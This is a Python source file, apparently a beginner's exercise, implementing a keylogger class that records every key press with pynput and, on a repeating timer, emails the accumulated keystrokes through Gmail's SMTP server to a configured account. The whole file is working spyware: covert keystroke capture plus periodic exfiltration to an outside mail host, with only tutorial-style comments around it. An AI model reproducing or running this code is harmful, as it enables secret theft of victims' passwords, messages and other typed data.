#!usr/bin/env python
import pynput.keyboard
import threading
import smtplib


class Keylogger:
    #defining a class
    def __init__(self, time_interval,email,password):
    #constructor method any code in this method will run automatically when we create the object
       self.log = "Keylogger started"
       self.interval = time_interval
       self.email = email
       self.password = password
       #this is an attribute

    def append_to_log(self, string):
        self.log = self.log + string


    def process_key_press(self,key):
        #in a method within the class we have to pass self means 1 st argument is always self
            try:
                current_key = str(key.char)

            except AttributeError:
        #try except is required because in key.char method the special character like tab space etc. is not logged
                if key==key.space:
                    current_key=" "
                else:
                    current_key = " "+str(key)+" "
            self.append_to_log(current_key)


    def report(self):
        #creating new log after 120 seconds
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval ,self.report)
        timer.start()

    def send_mail(self, email, password, messege):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        #587 is port number that google server use
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, messege)
        #sending messege form my mail to my mail
        server.quit()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press =self.process_key_press)
        #listener object
        with keyboard_listener:
            self.report()
            #starting of keybord Listener
            keyboard_listener.join()


